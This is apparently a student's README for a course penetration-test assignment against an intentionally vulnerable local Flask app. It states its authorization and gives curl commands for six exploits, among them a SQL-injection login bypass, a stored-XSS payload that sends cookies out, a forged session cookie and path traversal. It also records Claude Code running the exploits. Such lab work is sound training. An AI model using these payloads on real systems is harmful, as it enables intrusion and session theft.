# INF601 Mini Project 4 — Vuln Hub Penetration Test

Track: A

**Student:** cdmauch (FHSU) — _replace with your full name before submitting_

## Project overview

This repository is my submission for **Mini Project 4 (Cybersecurity Track A)**.
It documents an authorized penetration test of **Vuln Hub**, the instructor-
provided, intentionally vulnerable Flask application. I exploited the six planted
vulnerabilities — SQL injection, IDOR, stored XSS, broken authorization, path
traversal, and sensitive-data exposure — captured the `FLAG{...}` token for each,
and wrote up the evidence, impact, and remediation.

All six flags were validated **6/6** by the starter's `check_flags.py` for my
seed (`cdmauch`).

> **Note on repository contents.** This repo contains only my **submission**
> artifacts (report, flags, PoCs, AI-usage notes). It does **not** contain the
> Vuln Hub application itself (`app.py`, `check_flags.py`, templates, etc.) —
> that is the instructor-provided starter, obtained separately (see
> [Obtain and run the starter](#obtain-and-run-the-instructor-starter)).

## Submission contents (files in this repository)

- [`PENTEST_REPORT.md`](PENTEST_REPORT.md) — full pentest report: authorization
  statement, methodology, six findings with severity, evidence, and remediation.
- [`submission.txt`](submission.txt) — the six captured flags, one per line.
- [`AI_WORKFLOW.md`](AI_WORKFLOW.md) — phase-by-phase record of how I directed
  Claude Code during the test.
- [`AI_USAGE.md`](AI_USAGE.md) — AI-usage summary.
- Proof-of-Concept write-ups (each with the exact request/command and the actual
  response, plus the raw capture it references):
  1. [`poc/01_sqli.md`](poc/01_sqli.md) — SQL injection (login bypass)
  2. [`poc/02_idor.md`](poc/02_idor.md) — IDOR (read another user's message)
  3. [`poc/03_xss.md`](poc/03_xss.md) — stored XSS (admin cookie theft)
  4. [`poc/04_authz.md`](poc/04_authz.md) — broken authorization (forged session)
  5. [`poc/05_traversal.md`](poc/05_traversal.md) — path traversal
  6. [`poc/06_exposure.md`](poc/06_exposure.md) — sensitive-data exposure

## Authorization statement

All testing was performed **only** against the instructor-provided Vuln Hub
application running on **my own computer**, bound to **`127.0.0.1` (localhost)**
on port 5000. Vuln Hub is a deliberately insecure practice target provided for
this assignment. No other host, system, network, account, or person was tested,
scanned, or affected in any way. Testing was non-destructive and confined to the
local loopback interface. Testing systems you are not authorized to test is an
academic-integrity and conduct violation; this work stayed within the authorized
scope above.

## Obtain and run the instructor starter

The Vuln Hub application is **not** part of this submission repository. Obtain it
separately from the course materials (the `inf601-mp4-starter` provided by the
instructor via the LMS / course distribution) and run it on your own machine.

The commands below are grouped by shell. I ran Vuln Hub on **Windows**, setting
the seed in **PowerShell** and launching the app there; the per-finding exploits
were issued from **Git Bash** (so that `curl`'s `--data-urlencode` / `-G` options
behave as shown — in PowerShell, `curl` is an alias for `Invoke-WebRequest` and
will not accept these flags, so use Git Bash or `curl.exe`).

**PowerShell (Windows) — set the seed and start the app** from the starter's
`track_a_vulnhub` folder:

```powershell
# in the instructor starter folder, not this repo
python -m venv .venv
.venv\Scripts\Activate.ps1
pip install -r requirements.txt
$env:FLAG_SEED = "cdmauch"
python app.py
# serves http://127.0.0.1:5000
```

Leave that running, and confirm the home page does **not** show a red
"DEFAULT seed" banner (which would mean `FLAG_SEED` was not applied).

## Reproduce the findings

With the starter running at `http://127.0.0.1:5000`, each finding is reproduced
with the request below. Full requests, responses, and explanations are in the
[`poc/`](poc) write-ups and in [`PENTEST_REPORT.md`](PENTEST_REPORT.md).

**Bash (Git Bash on Windows)** — run these against the locally running starter:

```bash
# 1) SQL injection — login bypass (returns an admin session; flag on /dashboard)
curl -s -i -c cookies.txt \
  --data-urlencode "username=admin' -- -" --data-urlencode "password=x" \
  http://127.0.0.1:5000/login
curl -s -b cookies.txt http://127.0.0.1:5000/dashboard

# 2) IDOR — log in as the handout user, then read admin's message #1
curl -s -c alice.txt \
  --data-urlencode "username=alice" --data-urlencode "password=password123" \
  http://127.0.0.1:5000/login
curl -s -b alice.txt http://127.0.0.1:5000/messages/1

# 3) Stored XSS — store a script; the app's admin bot leaks its cookie to /grab
curl -s -b alice.txt \
  --data-urlencode "comment=<script>fetch('/grab?c='+document.cookie)</script>" \
  http://127.0.0.1:5000/guestbook
curl -s http://127.0.0.1:5000/grab          # shows the captured admin cookie+flag

# 4) Broken authorization — forge a superadmin session cookie and reach /vault
FORGED=$(printf '%s' "hacker:superadmin" | base64)
curl -s -i --cookie "auth=$FORGED" http://127.0.0.1:5000/vault

# 5) Path traversal — escape the public/ dir via ../
curl -s -G --data-urlencode "file=../private/employee_notes.txt" \
  http://127.0.0.1:5000/download

# 6) Sensitive-data exposure — robots.txt leaks /backups/; fetch the backup
curl -s http://127.0.0.1:5000/robots.txt
curl -s http://127.0.0.1:5000/backups/vulnhub.sql.bak
```

## Validate the flags

`submission.txt` (in this repo) is validated with the starter's checker, which
lives in the **instructor starter folder**, not here. Copy `submission.txt` into
the starter folder (or point to it by path) and run:

**PowerShell (Windows)** — from the starter folder:

```powershell
python check_flags.py submission.txt --username cdmauch
```

Expected output: each flag prints `VALID`, ending with
`6/6 flags valid for username cdmauch`.

## AI Usage

I used **Claude Code** (Anthropic's agentic CLI) as an assistant for this
authorized, local-only test. I remained responsible for the work and can explain
every step; a detailed, phase-by-phase account is in
[`AI_WORKFLOW.md`](AI_WORKFLOW.md).

**What Claude contributed (under my direction):**
- Read the starter's `app.py` and Track A README to locate the six planted bugs.
- Executed the exploits one finding at a time with `curl`, capturing the exact
  request and the actual response for each, and extracting the flag from the live
  response (not from source or the database).
- Saved the per-finding PoCs and raw responses under `poc/`, wrote
  `submission.txt`, and drafted `PENTEST_REPORT.md`, `AI_WORKFLOW.md`, this
  README, and `AI_USAGE.md`.
- Initialized the Git repository and organized the submission.

**My actual verification responsibilities:**
- I authorized and ran the test against only my local Vuln Hub instance, and set
  `FLAG_SEED=cdmauch`.
- I directed each step, reviewed every request/response and captured flag, and
  provided my FHSU username.
- I ran (and confirmed) the `check_flags.py` result of **6/6 valid**.
- I am responsible for finalizing items that require my personal input: replacing
  my name and signing/dating the authorization statement in `PENTEST_REPORT.md`,
  and confirming the accuracy of every statement before submission.

**Integrity:** No tests, results, screenshots, or flag values were invented.
Every flag was read from a live HTTP response produced by the corresponding
exploit and independently validated by the starter's `check_flags.py`.
